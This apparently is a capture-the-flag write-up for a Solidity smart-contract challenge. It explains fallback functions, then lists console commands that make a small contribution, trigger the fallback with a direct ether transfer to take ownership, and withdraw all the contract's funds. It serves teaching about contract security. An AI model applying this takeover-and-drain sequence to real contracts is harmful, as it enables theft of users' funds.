Learning: the fallback function is called when one calls a function that does not exist in the contract or when one sends ether to a contract with send, transfer or call. Fallback function:
- Cannot have a name
- Cannot have any inputs and outputs
- Must be declared as external
- Must be declared as payable to receive Ether
- To receive ether the function needs to be declared as payable
- It receives 2300 gas from transfer and send and can receive more gas when using the call method

### Solution

Copy the owner's address:
```
ownerAddr = await contract.owner();
```

Verify that the owner has a total contribution of 1000 ether:
```
await contract.contributions('0x9CB391dbcD447E645D6Cb55dE6ca23164130D008').then(v => v.toString())
```

Execute a contribution and verify the new player contribution balance:
```
await contract.contribute.sendTransaction({from: player, value: toWei('0.0009')})
await contract.getContribution().then(v => v.toString())
```

Force the fallback function to get called and verify the player is now the owner:
```
await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})
await contract.owner() == player
```

Withdraw all the funds:
```
await contract.withdraw()
```